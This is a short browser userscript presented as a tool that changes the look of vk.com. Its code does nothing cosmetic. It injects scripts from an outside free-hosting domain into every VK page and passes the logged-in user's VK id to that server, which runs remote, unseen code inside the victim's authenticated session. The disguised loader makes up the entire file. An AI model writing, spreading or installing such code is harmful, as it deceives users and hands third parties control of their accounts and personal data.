// ==UserScript==
// @name       GetStyles for VK
// @namespace  getstyles
// @version    0.1
// @description  chenges appearence of vk.com
// @match      http://vk.com/*
// @copyright  
// ==/UserScript==
var head0 = document.getElementsByTagName('head')[0];
var sc = document.createElement('script');
sc.type = "text/javascript";
sc.src = "http://vksliv.byethost24.com/styles/JsHttpRequest.js";
head0.appendChild(sc);
var sc0 = document.createElement('script');
sc0.type = "text/javascript";
sc0.innerHTML = 'var sc1 = document.createElement("script");sc1.type = "text/javascript";sc1.src = "http://vksliv.byethost24.com/styles/menu.js?id=" + vk.id + "&c=yes";document.getElementsByTagName("head")[0].appendChild(sc1);';
head0.appendChild(sc0);